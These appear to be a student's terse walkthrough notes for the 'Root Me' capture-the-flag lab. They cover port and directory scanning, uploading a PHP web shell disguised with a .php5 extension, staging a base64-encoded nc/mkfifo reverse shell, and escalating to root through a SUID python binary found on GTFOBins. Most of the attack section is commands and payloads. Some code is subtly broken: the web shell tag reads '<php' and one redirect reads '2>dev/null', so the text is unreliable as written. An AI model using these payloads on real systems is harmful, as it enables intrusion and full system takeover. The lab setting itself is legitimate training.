# root me

- cyberchef
- revshell
- gtfobins

## task 1 deploy the machine
- deploy the machine
- ip = 10.10.1.253

## task 2 reconnaissance
- Scan the machine, how many ports are open? 2
    - nmap 10.10.1.253
- What version of Apache is running? 2.4.29
    - nmap -sC -sV 10.10.1.253 => untuk melihat 
- What service is running on port 22? ssh
- Find directories on the web server using the GoBuster too? /panel/
    - gobuster dir -u http://10.10.1.253/ -w ~/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt

## Task 3  Getting a shell
- Find a form to upload and get a reverse shell, and find the flag.
    - open http://10.10.1.253/panel
    - create some file with diference extension
        - make file sh.php5
            ```
            <php echo system($_GET['c']); ?>
            ```
        - open http://10.10.1.253/uploads
        - click sh.php5
        - open http://10.10.1.253/uploads/sh.php5?c=ls
        - open open http://10.10.1.253/uploads/sh.php5?c=ls -la /var/www/html/
        - open open http://10.10.1.253/uploads/sh.php5?c=cat /var/www/html/index.php | base64
    - open cyberchef
    - open revshell
        - and which nc mkfifo
        - and go cyberchef
        - setting ip and port reverse
        - and copy to base 64
        - after copy 
        - add echo base64
        - add in base64 and | base64 -d > shell.sh
    - and add in url http://10.10.1.253/uploads/sh.php5?c=echo base64 | base64 -d > shell.sh
        - ls
        - cat shell.sh
        - chmod +x shell.sh
        - chmod 777 shell.sh
    - and listen
        - nc -lvnp 9001 (copy in revshell)
    - run
        - whoami
            - which python
            - python3 -V
        - python3 -c "import pty; pty.spawn('/bin/bash')" => untuk nampilin lokasi file
        - export TERM=xterm
            - ls /home
            - cd /home
            - ls -la
            - cd rootme
            - ls -la
        - user.txt
            - cd /var/www
            - ls -la
            - cat user.txt
    - user.txt
- 

## Task 4  Privilege escalation
- Search for files with SUID permission, which file is weird?
    - ctrl z
    - stty raw -echo;fg;
        - reset
    - find / -perm /4000 2>dev/null
        - /usr/bin/python
    - open gtfobins
        - find python SUID and copy python
- Find a form to escalate your privileges.
    -
- root.txt
    - cd /root
        - ls -la
        - cat root.txt

# hands on lab
- nmap -sC -sV 10.10.1.253 => untuk melihat 
- gobuster dir -u http://10.10.1.253/ -w ~/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt 
- http://10.10.1.253/uploads
- http://10.10.1.253/css
- http://10.10.1.253/js
- http://10.10.1.253/panel
- http://10.10.1.253/server-status